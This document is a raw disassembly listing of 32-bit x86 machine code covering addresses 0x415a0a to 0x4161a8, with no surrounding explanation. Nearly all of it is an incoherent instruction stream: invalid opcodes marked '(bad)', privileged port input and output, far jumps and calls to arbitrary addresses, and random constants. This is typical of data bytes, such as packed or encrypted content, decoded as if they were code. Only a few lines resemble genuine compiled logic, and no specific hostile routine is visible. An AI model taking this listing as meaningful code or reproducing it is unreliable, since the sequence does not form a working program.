  415a0a:	or     edi,eax
  415a0c:	inc    ecx
  415a0d:	std    
  415a0e:	and    edx,esp
  415a10:	xchg   ebx,eax
  415a11:	lods   eax,DWORD PTR ds:[esi]
  415a12:	inc    eax
  415a13:	out    0x6a,eax
  415a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a16:	xor    DWORD PTR [esi+0x4581105e],ecx
  415a1c:	xchg   DWORD PTR [edx],esi
  415a1e:	in     al,0x4e
  415a20:	int    0x3e
  415a22:	xor    eax,0xf316e0e4
  415a27:	rcl    BYTE PTR [edx],1
  415a29:	aas    
  415a2a:	fnstenv [esi+ebx*4+0x12da1a42]
  415a31:	dec    esp
  415a32:	clc    
  415a33:	pop    edx
  415a34:	pop    edx
  415a35:	jns    0x415a17
  415a37:	sub    al,0x7
  415a39:	sysenter 
  415a3b:	sbb    al,BYTE PTR [edi-0x6b]
  415a3e:	mov    eax,0x31d2461c
  415a43:	rol    BYTE PTR [ecx-0xb],0x86
  415a47:	mov    cl,0x5b
  415a49:	sub    al,0x50
  415a4b:	fdiv   DWORD PTR [ebp+0x734d7fca]
  415a51:	in     eax,dx
  415a52:	stos   DWORD PTR es:[edi],eax
  415a53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a54:	stos   DWORD PTR es:[edi],eax
  415a55:	fcom   DWORD PTR [ebx+0x57]
  415a58:	fucomp st(5)
  415a5a:	push   ds
  415a5b:	rcl    DWORD PTR [esi-0x23],0x3c
  415a5f:	out    dx,al
  415a60:	or     ebx,eax
  415a62:	cmp    ebx,DWORD PTR [ebx-0x6]
  415a65:	jle    0x415a18
  415a67:	add    DWORD PTR [edi+0x34f37faa],0x30cbc8b8
  415a71:	mov    cl,0xab
  415a73:	mov    bl,0x56
  415a75:	dec    esp
  415a76:	xchg   DWORD PTR [esi],ebp
  415a78:	test   esi,edx
  415a7a:	cmp    eax,0x617e8385
  415a7f:	scas   al,BYTE PTR es:[edi]
  415a80:	and    al,BYTE PTR [ebx]
  415a82:	into   
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	xchg   edx,eax
  415ab0:	aaa    
  415ab1:	rcl    dh,0x4e
  415ab4:	push   edi
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415af9
  415abc:	cli    
  415abd:	repnz mov bl,0x14
  415ac0:	repnz dec esi
  415ac2:	inc    esi
  415ac3:	cmp    BYTE PTR [edi-0x37424e96],al
  415ac9:	push   ebx
  415aca:	mov    eax,ds:0xae00f411
  415acf:	pop    ss
  415ad0:	mov    ebx,edx
  415ad2:	rcl    DWORD PTR [edx+0x62601d8e],cl
  415ad8:	cmp    cl,BYTE PTR [ecx-0x64]
  415adb:	jno    0x415ade
  415add:	xchg   BYTE PTR [edi],dl
  415adf:	retf   
  415ae0:	fstp   DWORD PTR [esp+esi*1]
  415ae3:	lock xor al,0xe7
  415ae6:	scas   eax,DWORD PTR es:[edi]
  415ae7:	mov    bl,0x26
  415ae9:	ins    DWORD PTR es:[edi],dx
  415aea:	cli    
  415aeb:	das    
  415aec:	jbe    0x415ad5
  415aee:	leave  
  415aef:	jb     0x415b26
  415af1:	dec    ebx
  415af2:	inc    esp
  415af3:	push   esi
  415af4:	push   esi
  415af5:	and    ch,BYTE PTR [ecx]
  415af7:	repnz data16 sub BYTE PTR [ecx+0xedcd9],dl
  415aff:	add    ah,bl
  415b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b02:	dec    eax
  415b03:	aas    
  415b04:	aaa    
  415b05:	aaa    
  415b06:	jno    0x415b73
  415b08:	sub    ebp,DWORD PTR [eax-0x4f48b576]
  415b0e:	push   eax
  415b0f:	(bad)  {k6}{z}
  415b14:	js     0x415b21
  415b16:	ja     0x415b72
  415b18:	adc    al,0x5b
  415b1a:	js     0x415adf
  415b1c:	inc    eax
  415b1d:	div    DWORD PTR [edi]
  415b1f:	les    esp,FWORD PTR [edx]
  415b21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b22:	inc    ebx
  415b23:	nop
  415b24:	jns    0x415b25
  415b26:	arpl   WORD PTR [ebx+ebx*2+0x38],si
  415b2a:	push   esp
  415b2b:	aad    0x1e
  415b2d:	ficomp DWORD PTR [ebp-0x4afd6fd5]
  415b33:	je     0x415b28
  415b35:	hlt    
  415b36:	repz mov eax,0x8c009adb
  415b3c:	mov    edi,DWORD PTR [ecx+0x39055d7e]
  415b42:	cmp    bh,BYTE PTR ds:0x3bf4392a
  415b48:	aaa    
  415b49:	mov    cl,0x37
  415b4b:	int    0x31
  415b4d:	or     eax,DWORD PTR ds:0x6e81ba29
  415b53:	sub    BYTE PTR [esi-0x69ac9e76],dh
  415b59:	imul   eax,DWORD PTR [ebx+0x6c],0xffffff91
  415b5d:	retf   0xb5e5
  415b60:	dec    ecx
  415b61:	and    BYTE PTR [ebx],cl
  415b63:	vcmpss xmm3,xmm3,DWORD PTR ds:0x53924de7,0xd8
  415b6c:	test   edx,edx
  415b6e:	adc    eax,0x64284acc
  415b73:	mov    WORD PTR ds:0x8cadf689,gs
  415b79:	iret   
  415b7a:	loopne 0x415b17
  415b7c:	cmp    DWORD PTR [esi+0x66bf1ab1],0xffffff93
  415b83:	push   esp
  415b84:	and    al,0x72
  415b86:	pop    ds
  415b87:	xchg   edx,eax
  415b88:	jae    0x415be3
  415b8a:	out    0xfa,al
  415b8c:	dec    ecx
  415b8d:	add    BYTE PTR [ebp+0x79f2dfc3],cl
  415b93:	xchg   edi,eax
  415b94:	and    eax,0xd50e9543
  415b99:	pop    eax
  415b9a:	sbb    al,BYTE PTR [edx-0x9]
  415b9d:	dec    BYTE PTR [ecx-0x5a]
  415ba0:	int    0x28
  415ba2:	leave  
  415ba3:	xchg   ebp,eax
  415ba4:	jns    0x415b32
  415ba6:	mov    esp,0x36f32855
  415bab:	sub    dl,al
  415bad:	sub    eax,0xd5b00bae
  415bb2:	push   0xfffffff7
  415bb4:	pop    esp
  415bb5:	and    eax,DWORD PTR [ecx]
  415bb7:	adc    BYTE PTR [esi],ah
  415bb9:	aas    
  415bba:	retf   
  415bbb:	iret   
  415bbc:	fbstp  TBYTE PTR [eax+eax*8+0x30]
  415bc0:	(bad)  
  415bc1:	shl    BYTE PTR [esi],1
  415bc3:	clc    
  415bc4:	js     0x415b83
  415bc6:	retf   
  415bc7:	or     al,0xf8
  415bc9:	outs   dx,DWORD PTR ds:[esi]
  415bca:	out    dx,eax
  415bcb:	pop    esp
  415bcc:	xor    DWORD PTR [esi],ecx
  415bce:	push   edi
  415bcf:	mov    ecx,0xbe39134c
  415bd4:	sar    DWORD PTR [eax+0x56],cl
  415bd7:	call   0x9232b4b6
  415bdc:	pop    ecx
  415bdd:	stc    
  415bde:	push   ss
  415bdf:	test   eax,0xa6ea9703
  415be4:	xor    ebx,DWORD PTR [ebx+0x5]
  415be7:	jnp    0x415c55
  415be9:	cs jl  0x415ba8
  415bec:	and    al,0xd8
  415bee:	dec    esi
  415bef:	test   DWORD PTR [edx+0x69b0d033],esi
  415bf5:	es jne 0x415bf7
  415bf8:	out    dx,al
  415bf9:	pop    edi
  415bfa:	mov    ebx,ebx
  415bfc:	bts    esi,edi
  415bff:	lea    ebx,[edi]
  415c01:	xchg   ecx,eax
  415c02:	mov    ds:0x2ae2722d,eax
  415c07:	fs retf 0x6aa3
  415c0b:	pop    esp
  415c0c:	cdq    
  415c0d:	in     al,dx
  415c0e:	sbb    DWORD PTR [ebp-0x38],ebp
  415c11:	sbb    bh,ah
  415c13:	sbb    ebp,ebx
  415c15:	xchg   DWORD PTR [esp+ebx*8],esp
  415c18:	lods   al,BYTE PTR ds:[esi]
  415c19:	dec    ecx
  415c1a:	xor    BYTE PTR [eax],ch
  415c1c:	shl    BYTE PTR [esp+esi*1-0x69],cl
  415c20:	dec    edx
  415c21:	leave  
  415c22:	imul   ecx,DWORD PTR [ebx+0x63952bfe],0x35
  415c29:	push   eax
  415c2a:	aas    
  415c2b:	test   ecx,ecx
  415c2d:	jnp    0x415ca7
  415c2f:	xchg   ebp,eax
  415c30:	test   eax,0x90cc7c4f
  415c35:	lods   al,BYTE PTR ds:[esi]
  415c36:	dec    ebp
  415c37:	(bad)  
  415c38:	ret    
  415c39:	outs   dx,DWORD PTR ds:[esi]
  415c3a:	or     ch,bh
  415c3c:	pop    esi
  415c3d:	in     al,dx
  415c3e:	jl     0x415c92
  415c40:	fld    QWORD PTR gs:[ebp+0x7d]
  415c44:	shl    BYTE PTR [edi+ebx*2-0x9],cl
  415c48:	mov    DWORD PTR [eax+edi*2-0x48],eax
  415c4c:	inc    ebp
  415c4d:	mov    eax,ds:0x4d51ca6d
  415c52:	and    edx,esp
  415c54:	push   esi
  415c55:	lea    edi,[eax]
  415c57:	push   ebx
  415c58:	pop    esp
  415c59:	sub    eax,0xda249fdd
  415c5e:	shr    DWORD PTR [ebx+0x56],cl
  415c61:	add    esi,ebp
  415c63:	jmp    0xaf742551
  415c68:	es jmp 0x415c8e
  415c6b:	adc    edi,edx
  415c6d:	push   edx
  415c6e:	push   esi
  415c6f:	fcom   DWORD PTR ds:0x558c138a
  415c75:	jb     0x415c3a
  415c77:	adc    eax,0x6aef3029
  415c7c:	mov    dl,0xe6
  415c7e:	iret   
  415c7f:	pusha  
  415c80:	jae    0x415c3a
  415c82:	and    dl,BYTE PTR [ebx+0x4f157785]
  415c88:	and    eax,0xc2f030a4
  415c8d:	pop    ds
  415c8e:	aaa    
  415c8f:	mov    eax,0xa3a0fa19
  415c94:	dec    edi
  415c95:	sbb    BYTE PTR [ecx+0x1f],ah
  415c98:	jbe    0x415d06
  415c9a:	sub    edi,DWORD PTR [ebx+0x25a5fb77]
  415ca0:	cmp    BYTE PTR ds:0xb243ec2b,bh
  415ca6:	pop    esi
  415ca7:	dec    eax
  415ca8:	fisttp WORD PTR [edi-0x19]
  415cab:	cmp    eax,0xfcc51ae8
  415cb0:	jmp    0x1693:0xd961696d
  415cb7:	test   al,0x50
  415cb9:	or     ebp,DWORD PTR [edi-0x51]
  415cbc:	add    BYTE PTR [eax],bl
  415cbe:	cmp    DWORD PTR [eax+0x776ce439],edx
  415cc4:	push   ebp
  415cc5:	(bad)  
  415cc6:	xchg   edi,eax
  415cc7:	(bad)  
  415cc8:	dec    ecx
  415cc9:	aam    0xcd
  415ccb:	das    
  415ccc:	stos   DWORD PTR es:[edi],eax
  415ccd:	push   ds
  415cce:	leave  
  415ccf:	mov    edx,0x99ce4e37
  415cd4:	inc    edx
  415cd5:	xchg   ebp,eax
  415cd6:	sbb    al,0x91
  415cd8:	mov    al,0x4d
  415cda:	lock sbb eax,0xdb95eb8a
  415ce0:	gs (bad) 
  415ce2:	lods   al,BYTE PTR ds:[esi]
  415ce3:	jmp    0x415d59
  415ce5:	mov    DWORD PTR ds:0x11f38170,eax
  415ceb:	xlat   BYTE PTR ds:[ebx]
  415cec:	mov    al,0xc6
  415cee:	or     DWORD PTR [ecx+0x3ce28798],edi
  415cf4:	popf   
  415cf5:	aaa    
  415cf6:	push   ss
  415cf7:	loop   0x415cc8
  415cf9:	js     0x415cdc
  415cfb:	xchg   ebx,eax
  415cfc:	push   ss
  415cfd:	xchg   edi,eax
  415cfe:	mov    edx,0x38e52e8
  415d03:	jge    0x415ceb
  415d05:	jbe    0xdaf9d5c6
  415d0b:	cmp    BYTE PTR [edi+ebx*8],0xbf
  415d0f:	lods   eax,DWORD PTR ds:[esi]
  415d10:	ficom  WORD PTR [ebx+ebx*4]
  415d13:	stos   DWORD PTR es:[edi],eax
  415d14:	cdq    
  415d15:	mov    bh,0xd
  415d17:	pop    esi
  415d18:	std    
  415d19:	ror    DWORD PTR [ebx],1
  415d1b:	into   
  415d1c:	push   0x12
  415d1e:	xchg   ebx,eax
  415d1f:	das    
  415d20:	adc    eax,0x17a96608
  415d25:	in     eax,0xe8
  415d27:	push   ebx
  415d28:	mov    al,0xe6
  415d2a:	sbb    eax,0x2dee5b8c
  415d2f:	mov    ebx,0x40039b1e
  415d34:	or     dl,BYTE PTR [edx+0xf]
  415d37:	ror    edi,1
  415d39:	sub    bh,bl
  415d3b:	or     ebp,esp
  415d3d:	or     al,0xe2
  415d3f:	push   es
  415d40:	pop    es
  415d41:	push   ebp
  415d42:	iret   
  415d43:	mov    cl,0xf7
  415d45:	mov    bl,0x58
  415d47:	imul   edx,ebx,0xac7e7c7
  415d4d:	dec    edi
  415d4e:	lock stc 
  415d50:	daa    
  415d51:	pushf  
  415d52:	jle    0x415d55
  415d54:	jecxz  0x415d78
  415d56:	jge    0x415d64
  415d58:	nop
  415d59:	mov    es:0x9c20866,al
  415d5f:	cs pop edx
  415d61:	pop    ebx
  415d62:	push   ss
  415d63:	out    dx,al
  415d64:	pop    edx
  415d65:	stos   BYTE PTR es:[edi],al
  415d66:	in     eax,dx
  415d67:	scas   al,BYTE PTR es:[edi]
  415d68:	test   BYTE PTR [ebp+0x7b],dh
  415d6b:	sbb    DWORD PTR [esi+ebp*1-0x2],0x2c3b9d53
  415d73:	scas   eax,DWORD PTR es:[edi]
  415d74:	loop   0x415d03
  415d76:	leave  
  415d77:	sahf   
  415d78:	les    ebp,FWORD PTR [edx+0x37]
  415d7b:	jnp    0x415d0d
  415d7d:	sbb    BYTE PTR [eax],0x28
  415d80:	call   0x903b18b6
  415d85:	icebp  
  415d86:	or     bl,ch
  415d88:	sar    BYTE PTR [edx],cl
  415d8a:	pop    ebx
  415d8b:	lods   al,BYTE PTR ds:[esi]
  415d8c:	add    BYTE PTR [esi-0x7f],ch
  415d8f:	xor    BYTE PTR [ecx+0x23],dh
  415d92:	jb     0x415d2d
  415d94:	dec    ecx
  415d95:	call   0xb9997944
  415d9a:	inc    ebp
  415d9b:	(bad)  
  415d9c:	mov    al,0x86
  415d9e:	data16 sti 
  415da0:	jae    0x415dc4
  415da2:	std    
  415da3:	push   ds
  415da4:	sub    al,0xd3
  415da6:	mov    edi,0xf311225c
  415dab:	sti    
  415dac:	jns    0x415dc1
  415dae:	cdq    
  415daf:	pushf  
  415db0:	and    ecx,DWORD PTR [eax]
  415db2:	inc    edx
  415db3:	bound  edi,QWORD PTR [esi]
  415db5:	ret    
  415db6:	in     eax,dx
  415db7:	pushf  
  415db8:	mov    ebx,0x2e0e7335
  415dbd:	int    0x2c
  415dbf:	jge    0x415e2e
  415dc1:	mov    edi,0x319790c
  415dc6:	inc    esp
  415dc7:	or     DWORD PTR [ecx-0x44],eax
  415dca:	int    0xfe
  415dcc:	dec    ecx
  415dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dce:	and    BYTE PTR [ebx],bl
  415dd0:	and    DWORD PTR fs:[edx+0x19],eax
  415dd4:	loopne 0x415e3f
  415dd6:	stos   DWORD PTR es:[edi],eax
  415dd7:	test   eax,0xdaae4863
  415ddc:	stos   BYTE PTR es:[edi],al
  415ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dde:	mov    dh,0x12
  415de0:	or     BYTE PTR [ecx+0x6a],bh
  415de3:	retf   
  415de4:	and    bh,BYTE PTR [edi+ecx*1+0x49]
  415de8:	(bad)  
  415de9:	ficom  DWORD PTR [edx+0x3327e1eb]
  415def:	adc    cl,dh
  415df1:	jbe    0x415e58
  415df3:	add    eax,DWORD PTR ss:[edx-0x52444c3]
  415dfa:	into   
  415dfb:	loopne 0x415dac
  415dfd:	pop    edi
  415dfe:	and    BYTE PTR [ebx],ch
  415e00:	mov    ds:0x2ba7b705,eax
  415e05:	jmp    0xd18dd0eb
  415e0a:	push   esi
  415e0b:	inc    edi
  415e0c:	dec    ebx
  415e0d:	hlt    
  415e0e:	into   
  415e0f:	adc    al,0x28
  415e11:	jmp    FWORD PTR [ecx+eax*8+0x4ee6733f]
  415e18:	stc    
  415e19:	sub    al,0x42
  415e1b:	inc    ecx
  415e1c:	adc    ch,dh
  415e1e:	jnp    0x415dcc
  415e20:	scas   al,BYTE PTR es:[edi]
  415e21:	ror    edx,1
  415e23:	cwde   
  415e24:	or     DWORD PTR [esi],0xffffffd9
  415e27:	mov    edx,0x582a1308
  415e2c:	ins    BYTE PTR es:[edi],dx
  415e2d:	adc    eax,0x51d5312e
  415e32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e33:	mov    ds:0xfd3a2a2f,al
  415e38:	loop   0x415e2c
  415e3a:	xchg   DWORD PTR [esi],esi
  415e3c:	stos   DWORD PTR es:[di],eax
  415e3e:	pop    ss
  415e3f:	(bad)  
  415e40:	lock xchg edi,eax
  415e42:	leave  
  415e43:	push   0x73d4447
  415e48:	fldenv [edx]
  415e4a:	jnp    0x415e9a
  415e4c:	mov    ds:0x4f533285,eax
  415e51:	pop    edx
  415e52:	aam    0x8f
  415e54:	xchg   ecx,eax
  415e55:	push   cs
  415e56:	jle    0x415e72
  415e58:	cmp    dh,BYTE PTR [esi]
  415e5a:	jno    0x415df7
  415e5c:	das    
  415e5d:	arpl   si,dx
  415e5f:	aas    
  415e60:	mov    dh,0x17
  415e62:	fsubr  QWORD PTR [esi]
  415e64:	cli    
  415e65:	jmp    0xc0f2:0x3d26b7bd
  415e6c:	xor    al,0x4e
  415e6e:	mov    al,ds:0xda1aa833
  415e73:	sbb    al,0x26
  415e75:	jle    0x415e2b
  415e77:	xchg   esi,eax
  415e78:	mov    DWORD PTR [ebx+0x3f4d9e9],ebp
  415e7e:	test   eax,0xae77dad4
  415e83:	dec    esp
  415e84:	sbb    ah,BYTE PTR [esi]
  415e86:	adc    edi,esp
  415e88:	dec    ebx
  415e89:	sub    al,0xd5
  415e8b:	in     eax,dx
  415e8c:	inc    eax
  415e8d:	test   BYTE PTR [edx],0x6a
  415e90:	sbb    DWORD PTR [eax-0x3f],edx
  415e93:	in     eax,dx
  415e94:	mov    bh,0xe7
  415e96:	out    dx,al
  415e97:	scas   eax,DWORD PTR es:[edi]
  415e98:	push   edi
  415e99:	jbe    0x415e4a
  415e9b:	push   0x2459eef4
  415ea0:	xchg   ebp,eax
  415ea1:	nop
  415ea2:	mov    bl,BYTE PTR [esi+ebp*2-0x48]
  415ea6:	cld    
  415ea7:	fnsave [edx]
  415ea9:	stos   DWORD PTR es:[edi],eax
  415eaa:	sub    cl,BYTE PTR [ecx-0x2d]
  415ead:	adc    DWORD PTR [esi+0x71],esi
  415eb0:	inc    ebx
  415eb1:	imul   esi,DWORD PTR ds:[eax+ebx*4+0x50],0x68
  415eb7:	imul   ebx,edi,0x14e86770
  415ebd:	ins    BYTE PTR es:[edi],dx
  415ebe:	fld    TBYTE PTR [ecx-0x74]
  415ec1:	mov    edx,0x721497c7
  415ec6:	cmp    eax,0x986279c9
  415ecb:	bound  ecx,QWORD PTR [ebx-0x60]
  415ece:	sub    eax,0x18ed976e
  415ed3:	repnz adc BYTE PTR [edx-0x5f],0xe3
  415ed8:	nop
  415ed9:	mov    ah,0x16
  415edb:	lods   al,BYTE PTR ds:[esi]
  415edc:	push   edi
  415edd:	nop
  415ede:	retf   
  415edf:	sbb    BYTE PTR [edi+edi*1-0x65d061b2],bl
  415ee6:	xchg   edi,eax
  415ee7:	sub    eax,0xca78290d
  415eec:	and    DWORD PTR [esp+edi*1],edi
  415eef:	or     DWORD PTR [ecx+0x2e],ecx
  415ef2:	and    al,0x4e
  415ef4:	dec    edi
  415ef5:	cs push esi
  415ef7:	jmp    0x46ca:0x9d856417
  415efe:	test   ecx,ecx
  415f00:	mov    DWORD PTR [ecx+eax*8+0x26],edi
  415f04:	mov    esp,0xa111cd7a
  415f09:	sub    BYTE PTR [edi],ch
  415f0b:	mov    al,ds:0xa09b91ff
  415f10:	das    
  415f11:	adc    al,BYTE PTR [ecx]
  415f13:	cli    
  415f14:	mov    al,ds:0xbf2e9a62
  415f19:	call   FWORD PTR [edx-0x27]
  415f1c:	adc    WORD PTR [ebx-0x85b43d2],0x7933
  415f25:	adc    DWORD PTR [ecx-0x2452bba1],esi
  415f2b:	pop    ecx
  415f2c:	iret   
  415f2d:	and    cl,ah
  415f2f:	ins    DWORD PTR es:[edi],dx
  415f30:	scas   eax,DWORD PTR es:[edi]
  415f31:	jge    0x415f3a
  415f33:	jp     0x415f47
  415f35:	sbb    ecx,ecx
  415f37:	mov    eax,ds:0x334c7872
  415f3c:	mov    al,ds:0x5c0ecb90
  415f41:	in     eax,0x67
  415f43:	or     eax,0xc35acd3b
  415f48:	rcl    ebp,cl
  415f4a:	iret   
  415f4b:	xchg   edi,eax
  415f4c:	cwde   
  415f4d:	cmp    al,0xb3
  415f4f:	pop    eax
  415f50:	inc    ecx
  415f51:	inc    edx
  415f52:	pop    ebx
  415f53:	cdq    
  415f54:	cmc    
  415f55:	ret    
  415f56:	sbb    al,0xbc
  415f58:	mov    eax,ds:0xbc3647f2
  415f5d:	int    0x38
  415f5f:	popa   
  415f60:	mov    ch,0x8c
  415f62:	sbb    al,0x9b
  415f64:	test   al,0x91
  415f66:	add    DWORD PTR [esi-0x2f],0xa6dda735
  415f6d:	sub    esi,DWORD PTR [ebp+0x51865aa7]
  415f73:	inc    ecx
  415f74:	cdq    
  415f75:	xchg   esp,eax
  415f76:	call   0xd08:0x71215128
  415f7d:	mov    ds:0xf852a6b9,al
  415f82:	mov    ebp,0xaec974be
  415f87:	lahf   
  415f88:	sub    DWORD PTR [ecx],edx
  415f8a:	sbb    DWORD PTR [ecx+eax*8-0x70edc008],ebx
  415f91:	add    al,0x92
  415f93:	shl    bl,0xac
  415f96:	xor    DWORD PTR [eax-0x21],esp
  415f99:	cmp    BYTE PTR [edi+ebx*4+0x26],0x55
  415f9e:	push   ds
  415f9f:	bound  ebx,QWORD PTR [ebx+0x519f1f4c]
  415fa5:	dec    eax
  415fa6:	les    ecx,FWORD PTR [ebx-0x54007508]
  415fac:	mov    al,0x2e
  415fae:	xor    eax,0xfd37e24a
  415fb3:	in     eax,0x58
  415fb5:	stc    
  415fb6:	test   BYTE PTR [eax+0x5c],dh
  415fb9:	aam    0x36
  415fbb:	sahf   
  415fbc:	adc    esp,ebx
  415fbe:	(bad)  
  415fbf:	lods   eax,DWORD PTR ds:[esi]
  415fc0:	data16 mov es,WORD PTR cs:[ebp-0x64878587]
  415fc8:	cs clc 
  415fca:	xor    eax,0x62b48a00
  415fcf:	(bad)  
  415fd0:	or     eax,0x7404dec7
  415fd5:	dec    eax
  415fd6:	js     0x416001
  415fd8:	ins    BYTE PTR es:[edi],dx
  415fd9:	and    DWORD PTR [ebx],edi
  415fdb:	mov    ebp,0x507794e2
  415fe0:	adc    BYTE PTR es:[ebp-0x12a2e0c3],0xc4
  415fe8:	mov    ebx,0x892b6708
  415fed:	or     esi,edi
  415fef:	mov    ah,0x7b
  415ff1:	sub    eax,DWORD PTR [ebp-0x10b376f4]
  415ff7:	(bad)  
  415ff8:	xchg   ecx,eax
  415ff9:	xchg   ebx,eax
  415ffa:	cwde   
  415ffb:	push   0xffffffa4
  415ffd:	mov    ds:0x97790e6d,al
  416002:	rcl    edi,0xbd
  416005:	ja     0x41601a
  416007:	push   ecx
  416008:	sub    eax,0xf394f779
  41600d:	push   ds
  41600e:	sti    
  41600f:	cli    
  416010:	fwait
  416011:	pop    ds
  416012:	cmp    al,0x56
  416014:	fdivr  QWORD PTR [edx]
  416016:	cwde   
  416017:	stc    
  416018:	mov    WORD PTR [edx],gs
  41601a:	adc    esp,ecx
  41601c:	sbb    DWORD PTR [esi],0x5e
  41601f:	jg     0x415fb3
  416021:	fst    QWORD PTR [edx]
  416023:	adc    edi,0xffffffc0
  416026:	aad    0x9d
  416028:	and    eax,0x72ab7b48
  41602d:	call   0xd5403df7
  416032:	imul   ebp,ecx,0x54
  416035:	bound  ecx,QWORD PTR [edx+esi*8-0xe]
  416039:	das    
  41603a:	xchg   ecx,eax
  41603b:	mov    ah,0xe6
  41603d:	inc    ebp
  41603e:	mov    cl,0x18
  416040:	enter  0x4d13,0xd1
  416044:	pop    ds
  416045:	fnop   
  416047:	pushf  
  416048:	xchg   ebp,eax
  416049:	call   0x529101a6
  41604e:	sbb    al,0xa6
  416050:	or     ebp,ecx
  416052:	add    dl,BYTE PTR [edi]
  416054:	fsubr  DWORD PTR [eax]
  416056:	int3   
  416057:	jne    0x4160cc
  416059:	outs   dx,DWORD PTR ds:[esi]
  41605a:	rol    DWORD PTR [edx],1
  41605c:	mov    al,ds:0xd2428fd9
  416061:	mov    ecx,0xbf913f90
  416066:	sar    DWORD PTR [esi+ecx*4+0x5df19fd1],1
  41606d:	lock inc eax
  41606f:	cld    
  416070:	mov    ecx,0x33174cf8
  416075:	ins    BYTE PTR es:[edi],dx
  416076:	sub    BYTE PTR [ebp+0x4da1a106],al
  41607c:	xchg   ecx,eax
  41607d:	push   esp
  41607e:	sub    BYTE PTR [eax+eiz*2-0x3a],dh
  416082:	pop    edx
  416083:	ins    DWORD PTR es:[edi],dx
  416084:	lock jle 0x4160c0
  416087:	mov    BYTE PTR [ebp+edi*1+0x1c9ba5f],dh
  41608e:	mov    bh,0x87
  416090:	cld    
  416091:	sar    BYTE PTR [eax-0x30],0xda
  416095:	call   FWORD PTR [edi]
  416097:	in     al,dx
  416098:	ins    BYTE PTR es:[edi],dx
  416099:	test   DWORD PTR [ebx-0x68f6b694],esp
  41609f:	adc    al,0x10
  4160a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160a2:	inc    esi
  4160a3:	(bad)  
  4160a5:	fcomp  QWORD PTR [eax-0x453324f3]
  4160ab:	adc    eax,DWORD PTR [ebx-0x61409a42]
  4160b1:	loope  0x416087
  4160b3:	dec    edi
  4160b4:	fidiv  DWORD PTR [edi]
  4160b6:	rol    edi,1
  4160b8:	push   edx
  4160b9:	cs not esi
  4160bc:	jge    0x416054
  4160be:	sbb    DWORD PTR [ebx-0x546d016f],edi
  4160c4:	mov    al,0x19
  4160c6:	fisub  DWORD PTR [ebp+0x403fee8a]
  4160cc:	cmp    al,0x22
  4160ce:	xchg   esi,eax
  4160cf:	sub    ebx,DWORD PTR [ebp+0x59]
  4160d2:	mov    edi,0x7046cc51
  4160d7:	or     edi,ebp
  4160d9:	jg     0x4160b2
  4160db:	pop    esp
  4160dc:	aas    
  4160dd:	or     eax,0x720ef696
  4160e2:	(bad)  
  4160e5:	jg     0x41615d
  4160e7:	in     al,0x9
  4160e9:	jmp    0xf144:0x96ebe3f5
  4160f0:	out    0xc4,al
  4160f2:	push   ds
  4160f3:	pop    ebx
  4160f4:	in     eax,dx
  4160f5:	pop    esi
  4160f6:	pop    ecx
  4160f7:	pop    eax
  4160f8:	arpl   cx,bx
  4160fa:	arpl   WORD PTR [ebx+0x399af50c],bx
  416100:	shl    cl,1
  416102:	scas   eax,DWORD PTR es:[edi]
  416103:	add    eax,0xdd9839ff
  416108:	std    
  416109:	inc    edx
  41610a:	push   ecx
  41610b:	out    0xd4,al
  41610d:	popf   
  41610e:	and    DWORD PTR [ecx-0x66],ebx
  416111:	inc    edx
  416112:	fimul  DWORD PTR [esi-0x18]
  416115:	sub    eax,0x15884a19
  41611a:	fwait
  41611b:	jmp    DWORD PTR [eax+ebx*4+0x35]
  41611f:	dec    esi
  416120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416121:	sbb    DWORD PTR [edi],edi
  416123:	out    dx,al
  416124:	rcl    BYTE PTR [ebx-0x7885163a],1
  41612a:	sub    ebp,DWORD PTR [esi+0x41cc990b]
  416130:	xor    DWORD PTR [edx+0x18a39658],ebp
  416136:	sbb    ebp,eax
  416138:	sbb    DWORD PTR [ebp-0x64],edx
  41613b:	jle    0x41615a
  41613d:	(bad)  
  41613e:	sahf   
  41613f:	push   esp
  416140:	hlt    
  416141:	js     0x4160d5
  416143:	pop    edi
  416144:	test   BYTE PTR [esi+ecx*2+0x174796a4],cl
  41614b:	cli    
  41614c:	xchg   ecx,eax
  41614d:	cmp    eax,0x8af537a7
  416152:	sub    cl,BYTE PTR [ecx+0x33748e3c]
  416158:	popa   
  416159:	add    al,0x24
  41615b:	retf   0x97df
  41615e:	test   al,0x5c
  416160:	dec    esp
  416161:	retf   0x70a6
  416164:	jns    0x41614a
  416166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416167:	jl     0x4160ff
  416169:	xchg   DWORD PTR [esp+esi*4-0x1d],edx
  41616d:	mov    dl,0xa4
  41616f:	retf   
  416170:	mov    bh,0xf8
  416172:	mov    ah,0x9
  416174:	pushf  
  416175:	mov    ds:0xd47e8ed,al
  41617a:	pop    esi
  41617b:	jmp    0x41613c
  41617d:	inc    ebx
  41617e:	xor    dh,BYTE PTR [ecx-0x4aaf58b7]
  416184:	xchg   DWORD PTR [ebx-0x7984d352],esp
  41618a:	lods   eax,DWORD PTR ds:[esi]
  41618b:	add    edx,DWORD PTR [ebx-0xa]
  41618e:	scas   eax,DWORD PTR es:[edi]
  41618f:	outs   dx,DWORD PTR ds:[esi]
  416190:	mov    ah,cl
  416192:	test   bh,al
  416194:	sbb    ah,BYTE PTR [ecx]
  416196:	push   esi
  416197:	mov    BYTE PTR [ecx+0x5c64c22],al
  41619d:	mov    ah,0xe5
  41619f:	mov    eax,ds:0xb7b19300
  4161a4:	jg     0x4161a4
  4161a6:	pop    ebp
  4161a7:	cdq    
  4161a8:	jecxz  0x4161c3
